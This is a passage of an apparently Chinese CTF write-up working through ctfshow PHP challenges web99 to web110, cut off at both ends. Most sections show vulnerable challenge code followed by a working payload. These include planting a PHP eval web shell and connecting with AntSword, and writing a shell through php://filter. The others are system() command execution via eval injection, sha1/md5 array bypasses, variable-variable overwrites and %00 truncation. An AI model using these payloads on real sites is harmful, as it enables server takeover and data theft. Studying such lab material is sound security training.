class="hljs-string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$allow</span>))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>要求：1、变量n存在于随机数组$allow中<br>知识点：<br>1.array_push()向数组尾部添加元素<br>2.file_put_contents($filename,$data,$data,$flags,$context)向文件中写入一个字符串，若没有文件，则先创建在写入<br>3.in_array($value,$array,$type)<br>弱类型比较<br>判断$value是否存在$array的值<br>$type若为true，则检测$value值与$array值的类型是否相同<br><strong>方法一：</strong><br>执行系统命令<br>get： n&#x3D;123.php 数字是多少无所为，小于0x36d就行，数组$allow是由36个小于0x36d的随机 数字组成，因此需要多试几次，虽然我试了很多次，但依旧没显示出来😭<br>post： content&#x3D;<?=system(tac fla*);?></p><p><strong>方法二：</strong><br>上传木马<br>get: n&#x3D;2.php<br>post: content&#x3D;<?php eval($_POST["233"])?><br><img src="/images/322.png"><br>然后我们开启中国蚁剑<br><img src="/images/455.png"><br>连接成功<br><img src="/images/562.png"><br>获得flag!</p><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-comment">//flag in class ctfshow;</span><br><span class="hljs-variable">$ctfshow</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span>=<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-subst">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>flag in class ctfshow</strong><br>先看v0,这里有个小特性，赋值&#x3D;的优先级高于逻辑运算，所以只要让is_numeric($v1)返回true即可满足if判断，and后面的无论结果如何都不影响<br>再看第二个if，注意函数前面的!(非),表示了v2不能出现;<br>第三个if表示v3里必须要出现 <strong>;</strong></p><p>payload：?v1&#x3D;123&amp;v2&#x3D;var_dump($ctfshow)&amp;v3&#x3D;;</p><p>tip: var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。.</p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span> = <span class="hljs-number">3.1</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出为：<br>float(3.1)<br>bool(true)</p><p>本题的var_dump()用来得到ctfshow里的内容。<br><img src="/images/623.png"></p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p>first 上代码</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs swift">highlight_file(__FILE__);<br>include(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-comment">//flag in class ctfshow;</span><br><span class="hljs-variable">$ctfshow</span> <span class="hljs-operator">=</span> new ctfshow();<br><span class="hljs-variable">$v1</span><span class="hljs-operator">=</span><span class="hljs-variable">$_GET</span>[&#x27;v1&#x27;];<br><span class="hljs-variable">$v2</span><span class="hljs-operator">=</span><span class="hljs-variable">$_GET</span>[&#x27;v2&#x27;];<br><span class="hljs-variable">$v3</span><span class="hljs-operator">=</span><span class="hljs-variable">$_GET</span>[&#x27;v3&#x27;];<br><span class="hljs-variable">$v0</span><span class="hljs-operator">=</span>is_numeric(<span class="hljs-variable">$v1</span>) and is_numeric(<span class="hljs-variable">$v2</span>) and is_numeric(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-operator">!</span>preg_match(<span class="hljs-string">&quot;/<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>|\/|\~|\`|\!|\@|\#|<span class="hljs-subst">\\</span>$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|<span class="hljs-subst">\&quot;</span>|<span class="hljs-subst">\&#x27;</span>|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-operator">!</span>preg_match(<span class="hljs-string">&quot;/<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>|\/|\~|\`|\!|\@|\#|<span class="hljs-subst">\\</span>$|\%|\^|\*|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\<span class="hljs-operator">-|</span>\<span class="hljs-keyword">_</span><span class="hljs-operator">|</span>\<span class="hljs-operator">+|</span>\<span class="hljs-operator">=|</span>\&#123;<span class="hljs-operator">|</span>\[<span class="hljs-operator">|</span>\<span class="hljs-string">&quot;|<span class="hljs-subst">\&#x27;</span>|\,|\.|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v3</span>)</span>)&#123;</span><br><span class="hljs-string">            eval(&quot;</span><span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span><span class="hljs-string">&quot;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">&#125; </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>可以看出这次特殊符号基本上都被禁用了，利用ReflectionClass(咱也不知道是啥，看题解也不会😭)建立ctfshow类的反射类，new ReflectionnClass($class)获得class的反射对象(包括了元数据信息) v3是不能为;以外的特殊字符</p><p>payload:?v1&#x3D;1&amp;v2&#x3D;echo new Reflectionlass&amp;v3&#x3D;;<br>获取的 flag 需要将 0x2d 替换成 -<br><img src="/images/2132.png"></p><h2 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v4</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v4</span>)&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>看到file_put_contents要条件反射，因为它可以配合伪协议</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">file_put_contents()</span><br><span class="language-xml">//用来写文件进去，其中文件名参数是支持伪协议的，用于将第二个参数content进行过滤器后再写进文件里面去</span><br><span class="language-xml">file_put_content($_POST[&#x27;filename&#x27;], &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);</span><br></code></pre></td></tr></table></figure><p>通过伪协议直接生成文件<br><code>?v3=php://filter/write=convert.base64-decode/resource=2.php</code><br>通过十六进制v2&#x3D;115044383959474e6864434171594473<br>post :v1&#x3D;hex2bin</p><p>然后得到 PD89YGNhdCAqYDs base64解码为<code>&lt;?=`cat *`;</code><br>访问2.php查看源码即可查看到flag</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>sha1()与MD5一样都是有漏洞可以绕过的</p><h4 id="sha1漏洞"><a href="#sha1漏洞" class="headerlink" title="sha1漏洞"></a>sha1漏洞</h4><p>例如这个代码：<code>$_GET[&#39;name&#39;]!=$_GET[&#39;password&#39;]&amp;&amp;sha1($_GET[&#39;name&#39;])===sha1($_GET[&#39;password&#39;])</code></p><p>可通过构造<code>?name[]&amp;password[]=123123</code> 来绕过<br>GET:?v2[]&#x3D;123123<br>POST:v1[]&#x3D;<br>得出flag</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$error</span>=<span class="hljs-string">&#x27;你还想要flag嘛？&#x27;</span>;<br><span class="hljs-variable">$suces</span>=<span class="hljs-string">&#x27;既然你想要那给你吧！&#x27;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span>===<span class="hljs-string">&#x27;error&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you doing?!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;<br>&#125;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value</span>===<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you doing?!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-variable">$flag</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$error</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your are good&quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-variable">$suces</span>); <br></code></pre></td></tr></table></figure><p>题目一共有三个变量$error $suces $flag 我们只要令其中一个的值为flag，都是可以通过die或者直接echo输出的<br>通过die($error)输出<br>get:a&#x3D;flag post:error&#x3D;a<br>进行的操作为</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$a</span>=<span class="hljs-symbol">$flag</span><br><span class="hljs-symbol">$error</span>=<span class="hljs-symbol">$a</span><br></code></pre></td></tr></table></figure><p>此时$a&#x3D;flag;$error&#x3D;flag,从而输出error也就是输出flag</p><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v2</span>) &amp;&amp; <span class="hljs-variable">$v1</span>!=<span class="hljs-variable">$v2</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>此题与104题相同，利用sha1的漏洞，post:v1[]&#x3D;<br>get:v2[]&#x3D;123123</p><p>获取flag</p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>       <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$v2</span>);<span class="hljs-comment">//parse_str(string(规定要解析的字符串),array(规定存储变量的数组名称。该参数指示变量存储到数组中))</span><br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$v2</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v3</span>))&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>       &#125;<br><br>&#125; <br></code></pre></td></tr></table></figure><p>看到MD5，我们选择数组绕过，让v1&#x3D;flag，我的理解是v2含于v1，v2[‘flag’],所以v1要包含flag<br>payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">GET</span><span class="hljs-symbol">:v3[]=</span><span class="hljs-number">122</span><br><span class="hljs-variable constant_">POST</span><span class="hljs-symbol">:v1=flag</span><br><br></code></pre></td></tr></table></figure><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])===<span class="hljs-literal">FALSE</span>)  &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br><br>&#125;<br><span class="hljs-comment">//只有36d的人才能看到flag</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))==<span class="hljs-number">0x36d</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>intval()函数用于获取变量的整数值。<br>strrev() 函数反转字符串。<br>0x36d&#x3D;877<br>且前面if是正则表达式匹配，则get里得有一个符合正则匹配的字符，即第一个要为字母<br>%00为截断作用，就是c语言中字符串的截止符号&#x2F;0的作用</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">payload:</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>a<span class="hljs-variable">%00778</span><br></code></pre></td></tr></table></figure><p>这样即满足了第一个if的正则匹配在%00处停止，也满足了第二个if反转弱比较等于877在%00处停止。</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo new <span class="hljs-subst">$v1</span>(<span class="hljs-subst">$v2</span>());&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>代码在此，正则表达式匹配，关键在于eval里的内容，意思为初始化一个v1类，v2()是传入这个类的参数，那么v1就是一个内置类<br>payload:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?v1=mysqli<span class="hljs-variable">&amp;v2</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;cat fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>也就是初始化一个mysqli类，但是实际上这个类的初始化时候传参不止这一个，所以是初始化失败的，但是由于其内部有魔术方法<code>_toString</code><br>如果类定义了toString方法，就能在测试时，echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。<br>这时候就可以echo出来了。<br>同样<code>Exception</code>也是可以的，这个类会把传入的参数输出出来，也是<code>_toString</code>方法的，所以payload如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?v1=<span class="hljs-keyword">exception</span>&amp;v2=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">highlight_file(__FILE__);<br>error_reporting(0);<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/\~|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            die(&quot;error v1&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if(preg_match(&#x27;/\~</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]/&#x27;, $v2))&#123;</span><br><span class="hljs-string">            die(&quot;error v2&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#125; </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>代码可知，正则匹配过滤了几乎除字母外的所有字符，所以web109的方法不再适用，找一个可以用的内置类和纯字母函数<br>类：<br>FilesystemIterator() 遍历文件类<br>directoryItrerator() 遍历目录类<br>函数：<br>getcwd() 